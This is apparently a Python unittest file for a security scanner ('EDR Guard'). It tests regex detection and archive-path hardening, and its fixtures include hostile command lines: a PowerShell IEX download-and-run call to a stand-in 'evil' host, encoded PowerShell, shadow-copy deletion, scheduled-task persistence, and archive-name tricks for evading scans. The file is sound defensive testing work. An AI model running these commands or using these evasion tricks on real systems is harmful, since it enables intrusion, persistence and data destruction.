"""Tests for EDR Guard's content pattern scanning.

Regression coverage for a bug where TEXT_PATTERNS (written as regexes, e.g.
`\\s+`, `(enc|e)`, escaped dots) were checked with a plain `in` substring test
instead of re.search(..., re.IGNORECASE). That silently made most malicious
patterns un-matchable against real content.

Run with: python -m unittest tests.test_guard -v
"""

import sys
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

import guard as g  # noqa: E402


class TextPatternDetectionTests(unittest.TestCase):
    def assert_blocked(self, data, label=""):
        with self.assertRaises(g.ThreatFound, msg=f"should have blocked: {label or data!r}"):
            g._scan_content("sample.txt", data, ".txt")

    def assert_clean(self, data, label=""):
        try:
            g._scan_content("sample.txt", data, ".txt")
        except g.ThreatFound as threat:
            self.fail(f"should NOT have blocked ({label or data!r}): {threat.reason}")

    def test_powershell_encoded_command(self):
        self.assert_blocked(b"powershell -enc JABzAD0A")
        self.assert_blocked(b"powershell.exe -e JABzAD0A")

    def test_wscript_shell_createobject(self):
        self.assert_blocked(b'Set objShell = CreateObject("WScript.Shell")')

    def test_cmd_exe_invocation(self):
        self.assert_blocked(b"cmd.exe /c whoami")

    def test_invoke_expression_shorthand(self):
        self.assert_blocked(b'IEX (New-Object Net.WebClient).DownloadString("http://evil")')

    def test_downloadfile(self):
        self.assert_blocked(b'(New-Object Net.WebClient).DownloadFile("http://evil/a.exe", "a.exe")')

    def test_vssadmin_shadow_delete(self):
        self.assert_blocked(b"vssadmin delete shadows /all /quiet")

    def test_schtasks_persistence(self):
        self.assert_blocked(b"schtasks /create /tn evil /tr evil.exe")

    def test_eicar_test_string(self):
        self.assert_blocked(
            b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
        )

    def test_benign_text_is_clean(self):
        self.assert_clean(b"Just a normal README talking about kittens and sharing files.")

    def test_benign_code_mentioning_shell_word_is_clean(self):
        # Make sure we're not so trigger-happy we block anything with the
        # word "shell" in it when it isn't an actual WScript.Shell call.
        self.assert_clean(b"def run_shell_command(cmd): return cmd  # just a function name")

    def test_case_insensitive(self):
        self.assert_blocked(b"POWERSHELL -ENC JABzAD0A")
        self.assert_blocked(b'createobject ( "shell.application" )')


if __name__ == "__main__":
    unittest.main()


class ArchiveAndPathHardeningTests(unittest.TestCase):
    """Regressions for guard bypasses found in the October 2026 review."""

    def _zip(self, members):
        import io
        import zipfile

        buffer = io.BytesIO()
        with zipfile.ZipFile(buffer, "w", zipfile.ZIP_DEFLATED) as archive:
            for name, data in members.items():
                archive.writestr(name, data)
        buffer.seek(0)
        return buffer

    def assert_archive_blocked(self, name):
        with self.assertRaises(g.ThreatFound, msg=name):
            g.scan_zip_buffer(self._zip({name: b"plain harmless text"}))

    def test_macosx_prefix_is_not_a_free_pass(self):
        self.assert_archive_blocked("__MACOSX/payload.exe")

    def test_trailing_dot_or_space_cannot_hide_an_extension(self):
        # Windows drops trailing dots/spaces when creating the file.
        self.assert_archive_blocked("evil.exe.")
        self.assert_archive_blocked("evil.exe ")
        self.assert_archive_blocked("evil.exe. .")

    def test_launcher_scripts_only_allowed_at_project_root(self):
        g.scan_zip_buffer(self._zip({"edr.cmd": b"@echo off"}))  # legit root launcher
        self.assert_archive_blocked("sub/dir/edr.cmd")
        self.assert_archive_blocked("a/edr.ps1")

    def test_edr_state_folder_is_rejected(self):
        self.assert_archive_blocked(".edr/sharers.json")
        self.assert_archive_blocked("project/.edr/sharers.json")

    def test_backslash_paths_are_normalised(self):
        self.assert_archive_blocked("sub\\dir\\payload.exe")

    def test_windows_colon_names_rejected_only_on_windows(self):
        from unittest import mock

        with mock.patch.object(g.sys, "platform", "win32"):
            with self.assertRaises(g.ThreatFound):
                g._check_name("notes.txt:hidden.exe")
        with mock.patch.object(g.sys, "platform", "linux"):
            g._check_name("release:notes.txt")  # legal on POSIX

    @unittest.skipIf(sys.platform == "win32", "needs the POSIX resource module")
    def test_zip_bomb_member_is_scanned_without_inflating_it(self):
        import resource

        member = bytes(64 * 1024 * 1024)  # 64 MiB of zeros -> a few KiB compressed
        buffer = self._zip({"big.txt": member})
        def peak_kib():
            peak = resource.getrusage(resource.RUSAGE_SELF).ru_maxrss
            return peak // 1024 if sys.platform == "darwin" else peak  # macOS reports bytes, Linux KiB

        before = peak_kib()
        g.scan_zip_buffer(buffer)
        grown_kib = peak_kib() - before
        self.assertLess(grown_kib, 32 * 1024, "scan inflated the whole member into memory")

    def test_scan_path_reads_only_the_scan_window(self):
        import tempfile
        from unittest import mock

        with tempfile.TemporaryDirectory() as folder:
            big = Path(folder) / "big.bin"
            big.write_bytes(bytes(g.MAX_SCAN_BYTES * 3))
            with mock.patch.object(Path, "read_bytes", side_effect=AssertionError("read the whole file")):
                g.scan_path(big)

    def test_threat_beyond_scan_window_is_not_seen_but_inside_it_is(self):
        import tempfile

        with tempfile.TemporaryDirectory() as folder:
            hit = Path(folder) / "hit.txt"
            hit.write_bytes(b"x" * 100 + b"invoke-expression" + b"x" * 100)
            with self.assertRaises(g.ThreatFound):
                g.scan_path(hit)
